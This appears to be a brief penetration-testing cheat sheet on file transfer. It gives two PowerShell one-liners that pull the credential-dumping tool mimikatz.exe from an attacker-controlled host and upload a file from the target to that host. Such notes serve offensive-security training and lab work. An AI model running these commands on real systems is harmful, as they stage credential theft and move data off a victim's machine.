# File Transfer

## Powershell

```text
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.189/mimikatz.exe','mimikatz.exe')
```

```text
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.189/upload.php','test.png')
```



